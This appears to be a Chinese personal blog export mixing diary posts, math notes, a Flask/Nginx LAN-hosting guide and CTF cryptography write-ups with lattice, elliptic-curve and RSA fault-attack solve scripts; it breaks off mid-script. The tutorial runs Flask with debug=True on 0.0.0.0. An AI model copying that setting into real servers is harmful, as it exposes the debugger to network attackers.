0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\ 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\ 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 &amp; 0\\\\ 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 &amp; 0\\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 3 &amp; 0\\\\ 256 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\ 0 &amp; 256 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\ 0 &amp; 0 &amp; 256 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\ 0 &amp; 0 &amp; 0 &amp; 256 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 256 &amp; \\cdots &amp; 0 &amp; 0\\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 256 &amp; 0 \\\\ -189 &amp; -189 &amp; -189 &amp; -189 &amp; -189 &amp; \\cdots &amp; -189 &amp; 256\\\\ \\end{pmatrix} $$ 此时矩阵 $m$ 的前 272 个行向量(即除开最后一个行向量)的整系数线性组合即为操作后可以得到的方阵化为一维后的向量， Level0 时只需令该向量与解向量相等，而 Level1 和 Level2 则需要算出离解向量最近的可由这 272 个向量整数系线性表出的向量作为新的解向量，因为我们不保证在一些点不可操作的前提下仍能整数系线性表出解向量(重点，敲黑板) 。 同时由于题目在模意义下进行，所以若解出的系数为负整数也可以模 256 化为正整数。 而 $m$ 的最后一个行向量为负的解向量，这里留给后面解释。 1234n = len(m)print('pre ok')m2 = Matrix(m).LLL()print('lll ok') 这里 n 取得 m 的行向量数，即 (144-16+144+1)=273 ，然后对 m 跑 LLL 算法进行格基规约，仍然得到一个 273x145 的矩阵。 我最常用的求 CVP 的近似解的办法是，给原来每个向量后面加个 0，然后再加个新向量，前面的位置是欲求 CVP 的向量，最后是一个很大的常数。给这个新的格跑一遍 LLL，结果中最后是大常数的那一行，就是我们想要的答案。—— mcfx 这就是为什么最后要补一列零向量的原因。 同时上面有一个细节，那就是 $m$ 的最后一个行向量为负的解向量，结合神的解释，我发现，若矩阵中最后一个行向量的最后一个维度为大常数，其他行向量的最后一个维度为 0 ，那么 LLL 后最后这个行向量只是与其他行向量的线性组合进行一次相加(或相减)，也就是说，这个方法将 CVP 化为 SVP 问题时，求解 SVP 的过程中不会对这个特殊行向量进行任何数乘！ 那么将这个向量直接乘上-1然后加上原来的解向量再抹去最后一维就是CVP的解了。 同时我观察了 m2 (即 m.LLL 后的结果)的特征，发现 273 个行向量中的 128 个均为零向量，恰为 273-145 个。这里有一个有趣的问题，那就是这 273 组基是否可以互相线性表出。 在线性代数中，一般的，我们在欧几里得空间即实数域里讨论向量的实数系组合问题，此时 145 维向量空间里的每个向量都可以由 145 个线性无关的向量线性表出。而格中是在向量的整数系组合下讨论问题，此时情况就有所不同了，比如以 $(1,1)$ 和 $(-1,1)$ 为基张成的格并不包括 $(1,0)$ 等向量，即不存在整数 $m,n$ 满足 $m*(1,1)+n*(-1,1)=(1,0)$ 。 找到 CVP 的答案 123456for i in range(n): if m2[i][144]: for j in range(144): m[-1][j] = m2[i][j] - m[-1][j] print(sum(abs(m2[i][j]) for j in range(144))) break 由上面分析可知，此时 m[-1] 的前 144 维就是新的解向量。至此， Level1 和 Level2 就可以化为 Level0 的解法了。 跑高斯消元求解 1234567s = []for i in range(144): t = [] for j in range(len(free)): t.append(m[j][i]) t.append(m[-1][i] % 256) s.append(t) 上面知道 free[] 是可以操作的点的坐标列表，故 len(free[]) 即为 144-16=128 。 这里取 $m$ 的前 (144-16)=128 个行向量的前 144 维进行转置作为系数矩阵与 $m$ 的最后一行向量的前 144 维变为列向量，合成增广矩阵，即为一个标准的非齐次线性方程组，即 $s$ 为一个如下的 144x145 的矩阵： $$ s=\\begin{pmatrix} 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\ 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 190\\\\ 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 &amp; 191\\\\ 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 &amp; 189\\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 3 &amp; 189 \\end{pmatrix} $$ 12345678for i in range(len(free)): for j in range(i + 1, 144): while s[j][i]: t = s[i][i] // s[j][i] for k in range(len(free) + 1): s[i][k], s[j][k] = s[j][k], (s[i][k] - s[j][k] * t) % 256for i in range(len(free), 144): assert s[i][len(free)] == 0 经以上消元后 $s$ 的第 129 行到最后一行均为 0 ，且系数矩阵与增广矩阵等秩，方程组有唯一解， $s$ 为如下的上三角矩阵： $$ s=\\begin{pmatrix} 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 188\\\\ 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 188\\\\ 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\ 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 190\\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 127 \\end{pmatrix} $$ 12345678ans = [0] * len(free)for i in range(len(free) - 1, -1, -1): t = s[i][len(free)] for j in range(i + 1, len(free)): t = (t - ans[j] * s[i][j]) % 256 for j in range(256): if j * s[i][i] % 256 == t: ans[i] = j 提交答案 12345678910111213sol = [[0] * 12 for _ in range(12)]for i, (x, y) in enumerate(free): sol[x][y] = ans[i]print(sol)data = { 'level': level_id, 'solution': str(sol),}headers = {'Cookie': 'xxx'}r = requests.post('http://202.38.93.111:12768/submit', headers=headers, data=data)print(r.text) 遇到的一些问题 Latex 矩阵无法正常显示 有少少离奇，这个博客主题要在矩阵的每行结尾加四个反斜杠才能正常换行，否则就挤作一行。 参考 https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/ https://docs.python.org/3/library/sys.html https://zhuanlan.zhihu.com/p/67978661","link":"/2022/03/31/%E7%81%AF%EF%BC%8C%E7%AD%89%E7%81%AF%E7%AD%89%E7%81%AF/"},{"title":"琐记 - 1","text":"第一篇技术无关的闲谈。 文章名加个 -1 是觉得还会有 -2，如今我似乎对技术失去了当初的狂热，以后的琐记估计还是会有的。像我这样水平一般的人，博客常年荒寂，估计也没什么人会注意到这篇文章，但是最近的苦恼总得找个地方宣泄下，我又没有写日记的习惯，就写在这里吧，写出来和说出来一样，也能令我舒畅几分。若是有人看到，也可当个乐子，我的经历若能博君一笑，甚至能让你有些启发，那就再好不过了。 物非人非转完专业，再次回归 CTF，发现校队和以前相比已经大不相同，去联队的去联队，毕业的毕业，不打比赛的不打比赛，新人也不怎么说话，群里气氛相当尴尬。想找到之前几个小菜鸡一起打比赛的感觉，那时虽然做不出来题目，但是大家都很愿意讨论吹水，群里热闹非凡，但是这种景象，我再也找不到了。 招新并不是转机借着 NewStarCTF 和 Hackergame，队里招了一批新人，我并不指望他们现在的技术能很高，谁不是从菜鸡过来的，有兴趣就行嘛。于是我一晚上搓了个 kali 的 ssh 密钥 adder 给他们玩，想让他们学一下 PoW 和 ssh。但是他们似乎并不感兴趣，虽然是并没有投入很多心力做的事情，但是还是感觉比较落寞。 原神，启动在 GZTime 学长的劝导下，我也觉得可能是我太急了，于是我放弃了挣扎，打开了原神，开始了我的冒险之旅。之前我很难想象这么无聊的游戏怎么会有人玩，但是这下从诋毁原神，到理解原神了。在我现在的阶段中，原神更像是一个逃避现实的桃源，接触里面的世界和读玄幻小说一样，令人心驰神往。米哈游太精明了，二次元的钱太好赚了，我震惊于一个赌博游戏能合理地存在于现代的璃月中，如此庞大数量的、代表人类苦难生产力的货币，投入到虚无缥缈的概率中。在闲鱼花 45r 刷了 5000 原石，初次接触这些，我并不知道用的是科技，于是号被封了 7 天。高中同学早退游了，把号给我玩，一块钱没充，我给他抽了个水神出来，然后又把最新的剧情过完后，觉得很无聊，想玩自己的号了。 还有两天解封，我不知道现实能不能趁机拯救我。","link":"/2023/11/21/%E7%90%90%E8%AE%B0%20-%201/"},{"title":"琐记 - 2","text":"谨以此文，记念我的外婆。 说记念而不是纪念，是因为我外婆也不是什么了不起的人，她只是一个普通的老人。 小的时候，爸妈上班的时候没时间照顾我，就把我留在外婆家，让外公外婆照顾我。 可以说，我小时候就是妈妈和外婆带大的。 上小学的时候，我喜欢玩洛克王国，舅舅又不给我玩电脑，便求着外婆要舅舅房间的钥匙。外婆拗不过我，帮我把门开了，说我玩瞎了眼以后不要怪她。 这些话我至今还记得，也根本不可能去怪外婆。 昨天周五，睡醒的时候已经是中午 12 点了，看到家里人说外婆十点半往生了，感到有一丝难受，但又不是很多。 因为早三个月前，我就已经想到会有这一天了。 三个多月前，外婆已经是诊断出可能患癌了，但是也没有确诊，因为确诊要做穿刺——但是外婆已经经不起折腾，就算确诊，也撑不过手术了，就没做进一步检查。 三个月前的一天，下午两点，我正准备去上课，妈妈忽然打电话给我，带着哭声，说外婆可能撑不过晚上了。我有点慌，马上又回到宿舍，收拾好东西，坐高铁回家。 到外婆家的时候，外婆躺在床上，已经看不见东西了，大概是因为癌细胞已经破坏了视神经。 她听到说是我回来看她，很开心，抓着我的手，说不用挂着她，说已经活够了，让我快点回学校好好读书。我没忍住眼泪，哭了。 不知道是幸运还是不幸，外婆还是撑了下来，给了她的子女最后一次尽孝的机会。 外婆的身子一直不好，腿经常痛，病的这几个月，也是一直在头痛中度过，各种止痛药吃个不停。 逝世对她来说，或许也是一种解脱。 她的三个子女也不用再为她的病痛来回操心了。 所以我并不觉得这是一件十分悲伤的事情。 外婆是一个虔诚的佛教徒，一生都在念佛。尽管我是一个坚定的无神论者，觉得佛教的传播甚至起源都是统治者操控思想的手笔，此刻我还是希望，她已经到了她所一直向往的西方极乐世界。 在这里写这篇文章，也是相信《寻梦环游记》里的话。 只要这个世界还有人记得外婆，还有地方存在对她的思念，她就不会真正死去。 互联网上也会长久地为她念一声佛号—— 阿——弥——陀——佛—— 一些画像外婆经常觉得我没吃饱，大概是因为我太瘦了，但也就是这段时间，我忽然就胖到将近正常体重了。 每次看望外婆要回家的时候，总会让我带点苹果回去。 另一些琐事最近打完长城杯了，校队还是没什么起色。当初 tel 去 VN 的时候有叫上我，我想着留在校队里守一下，却不想成了一个巨大的遗憾。现在随着 CTF 的回归，想找点同级或者年轻的交流下，发现校队里没什么交流，S1uM4i 里又都是老登，人也基本都在广州，平时线下见面少之又少。前几天睡眠不足，脑抽了投个简历给 VN，想进去只水群不打比赛，后来才反应过来这操作有够抽象的，被背地里嘲笑一番估计是免不掉了。 时代的尘埃，落在一个人身上，就是一座大山。 现今版本，联队翻手之间，就能把我所向往的校队震为泡影。我为校队做的一切努力，都不过徒劳。还记得当初也是为了校队的传承选的密码，现在想来，若是选的 web，估计也不至于此。","link":"/2024/05/18/%E7%90%90%E8%AE%B0%20-%202/"},{"title":"群","text":"有人问一个小女孩，3+4 等于几啊？小女孩说：“不知道，但我知道 3+4 等于 4+3 .”这人只好接着问：“为什么呀？”小女孩答道：“因为整数与整数加法构成了阿贝尔群。” 前言虽然之前大概也能 get 到笑点，但只觉得阿贝尔群是个高深的概念，也没有细究。后来我接触到密码学，然后就开始学习近世代数，才知道了阿贝尔群就是交换群（即群上的代数运算满足交换律）。一开始是在 B 站看的视频，后来发现那个系列是纯数学的，不大适合我，于是转回来看一本叫《近世代数及其应用》的书，正式开始记下笔记。 思来想去，我还是把之前写的一堆定义公式删了，那些个符号我当时不想看，现在也不想写，就试着科普向一点吧，毕竟我写文章也不是为了自娱自乐。 群的定义群，一个概念，也并非什么高深的东西，就是一个集合和集合上的运算，注意这个集合上的，已经包含了封闭律的意思，所谓封闭律，就是集合上的两个元素的运算结果还在这个集合，比如整数的加法和乘法，而整数的除法就不是了。而在这里的运算已经是一种泛义的说法，包括但不限于加法、乘法、除法、求余等等，甚于我定义出来的运算也是一种运算。在群中的运算一般用$\\circ$或$\\cdot$表示，有时也姑且称之为乘，但注意大多时不是指数的乘法。同时，群还满足结合律，存在单位元和逆元。 结合律不必多说，就是括号随便加，而单位元的意思就是，集合中任意元素与这个单位元运算后还是本身，比如任意整数加 0 都不变，那么 0 就是整数加群中的单位元，同理1是有理乘法群中的单位元。而逆元同样是针对集合上每个元素，性质就是任意元素与其逆元作运算后都等于单位元，比如整数加群中，1 的逆元是 -1，10086 的逆元是 -10086 ；有理乘法群中，1 的逆元还是 1 ，10086 的逆元是 1/10086 。注意到，对于整数和数的乘法而言，10086 并没有逆元，故整数和数的乘法不作成群。 插播一下：混进一个抽代群时有一个进群验证，题目是给出 A5 的全部正规子群，而我甚至连 A5 是啥都不知道，but 我有sagemath，嘿嘿，直接跑出单位元和 A5 本身，我又试了几下，发现只有 A4 除开单位元和自身外有其他正规子群，非常奇妙。代码如下： 1234567891011#!sagex=5Ax = AlternatingGroup(x)for i in Ax.conjugacy_classes_subgroups(): if i.is_normal(Ax): if(i==Ax): print('Ax') else: print(i) for j in i.list(): print(j)","link":"/2022/03/08/%E7%BE%A4/"},{"title":"记一次在局域网搭网站","text":"在学校里用自己电脑( Windows10 环境)当服务器搭了个网站，仅可在校园网下访问，图一乐。 基础安装 flask 框架Flask 是一个好用且简单的 web 框架，更多操作可以参考 Flask官网。pip install flask当然前提得先装好 python ，不提。在 VSCode 下可以直接用 Code runner 运行下面代码。 1234567891011from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return 'Hello World!'if __name__ == '__main__': app.run( host='0.0.0.0', # 加了这个参数局域网内部才可以通过本机ip访问 port=5000, # 端口也可以设成80，访问的时候不用加端口号 debug=True, # 开启调试模式，可以实时监控代码更改 ) 这样，一个基础的网页就搭建好了，在同一个局域网用浏览器访问 http://&lt;你电脑的内网IP&gt;:5000 就能看到 Hello World! 了。但是我在连着无线网的笔记本部署却不能访问，也 ping 不通笔记本的 ip ，其中原因有待细究。 更新：无线网无法访问是因为学校防挖矿病毒，把低端口封了。 进阶Nginx有域名的可以下个 Nginx 玩，体验感高很多(bushi)。Nginx 下载地址 http://nginx.org/en/download.html建议下载稳定版的，即 Stable version 。下载后直接解压即可，不要双击 Nginx.exe。用终端打开 Nginx 的目录，然后使用命令 start nginx 运行。以下是一些 Nginx 的常用命令：( Windows 下没有添加环境变量的情况下 nginx 需要换成 ./nginx xxx ) 1234nginx -s reload # 重载配置文件，更改配置文件后记得重载nginx -s reopen # 重启Nginxnginx -s stop # 强行停止Nginxnginx -s quit # 正常退出Nginx 有个小坑就是有时不一定能通过上面的两个命令停止 Nginx ，这时在任务管理器是能看见 Nginx 的进程还在的，需要手动杀掉，否则可能无法正常重载配置文件(即 config 文件)。同时觉得用命令行太麻烦了，就写了个 Python 的脚本配合 Flask 操作，如下： 1234567891011121314151617181920212223242526272829303132333435363738from subprocess import Popen, PIPEimport psutilimport osclass Nginx: def __init__(self, path): self.path = path # Nginx的目录(绝对路径) def start(self): obj = Popen(&quot;start nginx&quot;,cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE) def quit(self): obj = Popen(&quot;nginx -s quit&quot;,cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE) out_info, out_error = obj.communicate() return (out_info, out_error) def reload(self): obj = Popen(&quot;nginx -s reload&quot;,cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE) out_info, out_error = obj.communicate() return (out_info, out_error) def restart(self): obj = Popen(&quot;nginx -s reopen&quot;,cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE) out_info, out_error = obj.communicate() return (out_info, out_error) def killall(self): pids = psutil.pids() for pid in pids: p = psutil.Process(pid) if p.name() == 'nginx.exe': print(pid) p.kill() def status(self): pids = psutil.pids() nginxpid=[] for pid in pids: p = psutil.Process(pid) if p.name() == 'nginx.exe': nginxpid.append(pid) if len(nginxpid)==0: return('Nginx未运行') else: return('%d 个Nginx进程正在运行中' % len(nginxpid)) nginx.conf 文件(即 Nginx 配置文件，位于 Nginx 的 conf 目录下)的 server 配置如下： 1234567server { listen 80; server_name example.com; location / { proxy_pass http://127.0.0.1:5000; } } proxy_pass 后面那个地址必须是本地能访问的，此时我已经将上面python代码中的 host='0.0.0.0' 删掉了。server_name 后面填写域名，记得要先添加 A 记录到局域网 ip ，我为了图方便直接添加了泛域名解析(即 *.example.com )。 SSL 证书证书申请由于个人有一丢丢强迫症，看到浏览器 http 的不安全提示总是有点膈应，就想着部署个 SSL 证书解决。然而，其中过程非常麻烦，我最终还是在阿里租的服务器上用宝塔申请了个 Let’s Encrypt 证书(免费的，白嫖永不过时)，然后一开始浏览器竟然显示证书是我那个服务器用的域名，折腾了两下换回去又好了，也是莫名其妙的。 更新：https://letsencrypt.osfipin.com/这个网站似乎不错 一些问题DNS 的验证逻辑非常奇怪，建议添加 TXT 记录后等待 10 分钟左右再提交验证申请(我就是栽了几次都验证失败，浪费好多时间)。同时我在 Windows 用 Certbot 申请的时候出现了写入权限的错误，也是莫名其妙的，既然日志文件都能写在目录下，证书却写不了。 Nginx 配置如下： 1234567891011121314151617181920212223server { listen 80; listen 443 ssl http2; listen [::]:443 ssl http2; server_name example.com; location / { proxy_pass http://127.0.0.1:5000; } # 强制使用 HTTPS，可选 # if ($server_port !~ 443) { # rewrite ^(/.*)$ https://$host$1 permanent; # } ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; ssl_certificate 证书文件路径; ssl_certificate_key 私钥文件路径; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on;}","link":"/2022/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9C%A8%E5%B1%80%E5%9F%9F%E7%BD%91%E6%90%AD%E7%BD%91%E7%AB%99/"},{"title":"高数上笔记","text":"忽然能转了，尝试速成高数上 前言有空再写。 笔记正文第一章 函数与极限连续函数间断点的分类第二章 微积分的基本概念不定积分积分表 $\\int x^\\alpha\\mathrm dx = \\frac{1}{\\alpha+1}x^{\\alpha+1}+C(\\alpha\\neq-1)$ $\\int\\cos x\\mathrm dx = \\sin x+C$;$\\int\\sin x\\mathrm dx = -\\cos x+C$ $\\int\\sec^2x\\mathrm dx = \\tan x+C$;$\\int\\csc^2x\\mathrm dx = -\\cot x+C$ $\\int\\frac{\\mathrm dx}{1+x^2} = \\arctan x+C$;$\\int\\frac{\\mathrm dx}{\\sqrt{1-x^2}} = \\arcsin x+C$ $\\int\\alpha^x\\mathrm dx = \\frac{1}{\\ln\\alpha}\\alpha^x+C(\\alpha&gt;0,\\alpha\\neq1)$ $\\int\\frac1x\\mathrm dx = \\ln|x|+C$ 第三章 积分的计算及应用第四章 微分中值定理与泰勒公式微分中值定理又称为拉格朗日中值定理：设 $y=f(x)$ 在 $[a,b]$ 上连续，在 $(a,b)$ 内可导，则必存在一点 $c\\in(a,b)$，使得$$f’(c) = \\frac{f(b)-f(a)}{b-a}$$ 例 证明当 $e &lt; a &lt; b &lt; e^2$ 时，$(b-a)\\frac{2}{e^2}&lt;\\ln^2b-\\ln^2a&lt;\\frac4e(b-a)$解 泰勒公式常用 $\\ (x\\rightarrow0)$： $e^x=1+x+\\frac{1}{2!}x^2+\\cdots+\\frac{1}{n!}x^n+o(x^n)$ $\\sin x = x - \\frac{1}{3!}x^3 + \\cdots + (-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!} + o(x^{2n})$ $\\cos x = 1 - \\frac{1}{2!}x^2 + \\cdots + (-1)^n\\frac{x^{2n}}{(2n)!} + o(x^{2n+1})$ $\\ln(1+x) = x - \\frac{x^2}{2} + \\frac{x^3}{3} + \\cdots + (-1)^{n-1}\\frac{x^n}{n} + o(x^n)$ $(1+x)^\\alpha = 1 + \\alpha x + \\frac{\\alpha(\\alpha-1)}{2!}x^2 + \\cdots + \\frac{\\alpha(\\alpha-1)\\cdots(\\alpha-n+1)}{n!}x^n + o(x^n)$ 第五章 向量代数与空间解析几何","link":"/2023/05/05/%E9%AB%98%E6%95%B0%E4%B8%8A%E7%AC%94%E8%AE%B0/"},{"title":"2022 巅峰极客 Crypto","text":"有瓜吃，美滋滋 题目质量一般，知识问答还全是搬运今年 ciscn 的。然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。 point-power1234567891011121314151617181920212223242526from Crypto.Util.number import *from gmpy2 import *from random import *from secrets import flagassert len(flag)==42p=getPrime(600)a=bytes_to_long(flag)b=randrange(2,p-1)E=EllipticCurve(GF(p),[a,b])G=E.random_element()x1,y1,_=GG=2*Gx2,y2,_=Gprint(f&quot;p = {p}&quot;)print(f&quot;b = {b}&quot;)print(f&quot;x1 = {x1}&quot;)print(f&quot;x2 = {x2}&quot;)'''p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727''' 这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。首先查到椭圆曲线的加法（两点相同的情形）：$$x_2=m^2-2x_1\\pmod p \\ with \\ m=\\frac{3x_1^2+a}{2y_1}$$又在 Sagemath 文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程，exp 如下： 1234567891011121314151617p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727K = GF(p)n=(K(x2+2*x1)).sqrt()P.&lt;x&gt;= PolynomialRing(K)A=1B=6*x1**2-4*n**2*x1C=-(4*n**2*x1**3+4*n**2*b-9*x1**4)f=A*x**2+B*x+Croots=f.roots()print(roots)flag=roots[1][0]from Crypto.Util.number import *print(long_to_bytes(int(flag))) strange curve123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from Crypto.Util.number import *from gmpy2 import *from secrets import flagimport randomdef add(P,Q): (x1,y1)=P (x2,y2)=Q x3=(x1+x2)*(1+y1*y2)*invert((1+x1*x2)*(1-y1*y2),p)%p y3=(y1+y2)*(1+x1*x2)*invert((1-x1*x2)*(1+y1*y2),p)%p return (x3,y3)def mul(e,P): Q=(0,0) e=e%p while e: if e&amp;1: Q=add(Q,P) P=add(P,P) e&gt;&gt;=1 return Qdef Legendre(a,p): return (pow((a%p+p)%p,(p-1)//2,p))%pdef get_ts(p): p=p-1 count=0 while p%2==0: count+=1 p=p//2 return count,pdef get_nonre(p): a=random.randint(1,p) while Legendre(a,p)==1: a=random.randint(1,p) return adef amm2(a,p): t,s=get_ts(p) ta=pow(get_nonre(p),s,p) tb=pow(a,s,p) h=1 for i in range(1,t): d=pow(tb,2**t-1-i,p) if d==1: k=0 else: k=1 tb=(tb*pow(ta,2*k,p))%p h=(h*pow(ta,k,p))%p ta=pow(ta,2,p) return h*pow(a,(s+1)//2,p)%p def solve(a,b,c,p): tmpa=1 tmpb=b*inverse(a,p)%p tmpc=c*inverse(a,p)%p assert Legendre(tmpb**2*inverse(4,p)-tmpc,p)==1 res1=(amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p res2=(-amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p return (res1,res2)def lift(x,a,b,p): tmp=b*(x**2-1)*inverse(a*x,p)%p return solve(1,-tmp,-1,p)[0]p=9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353a=54733430689690725746438325219044741824500093621550218736194675295708808435509b=75237024593957256761258687646797952793573177095902495908321724558796076392871x=bytes_to_long(flag)while True: try: y=lift(x,a,b,p) break except: x+=1 continueassert a*x*(y**2-1)%p==b*y*(x**2-1)%pP=(x,y)e=65537eP=mul(e,P)print(f&quot;P = {P}&quot;)print(f&quot;eP = {eP}&quot;)'''P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)eP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))''' 这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。直接拿第一个数 long_to_bytes ，得到 flag。 Learning with fault1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from Crypto.Util.number import *from gmpy2 import *from secrets import flagimport osclass RSA(): def __init__(self,p,q,e): self.p=p self.q=q self.e=e self.phi=(p-1)*(q-1) self.d=invert(self.e,self.phi) self.dp=self.d%(p-1) self.dq=self.d%(q-1) self.n=p*q self.N=getPrime(512)*getPrime(512) def sign(self,message): m=bytes_to_long(message) sig_p=pow(m,self.dp,self.p) sig_q=pow(m,self.dq,self.q) alpha=q*invert(q,p) beta=p*invert(p,q) return long_to_bytes((alpha*sig_p+beta*sig_q)%self.n) def corrupt_sign(self,message): m=bytes_to_long(message) sig_p=pow(m,self.dp,self.p) sig_q=pow(m,self.dq,self.q) alpha=q*invert(q,p) beta=p*invert(p,q) return long_to_bytes((alpha*sig_p+beta*sig_q)%self.N) def verify(self,message,sign): return long_to_bytes(pow(bytes_to_long(sign),self.e,self.n))==messagep=getPrime(512)q=getPrime(512)e=65537rsa=RSA(p,q,e)with open(&quot;sign.txt&quot;,&quot;w&quot;) as f1: with open(&quot;corrupted_sign.txt&quot;,&quot;w&quot;) as f2: for _ in range(6): message=os.urandom(64) sign=rsa.sign(message) corrupted_sign=rsa.corrupt_sign(message) assert rsa.verify(message,sign) f1.write(str(sign)+'\\n') f2.write(str(corrupted_sign)+'\\n')enc=pow(bytes_to_long(flag),rsa.e,rsa.n)print(f&quot;n = {rsa.n}&quot;)print(f&quot;N = {rsa.N}&quot;)print(f&quot;e = {rsa.e}&quot;)print(f&quot;enc = {enc}&quot;)'''n = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729N = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731e = 65537enc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396''' 出题论文：https://eprint.iacr.org/2011/388.pdf这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。exp 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from tqdm import tqdmfrom itertools import combinationsfrom sage.all import *from Crypto.Util.number import *co_sig = 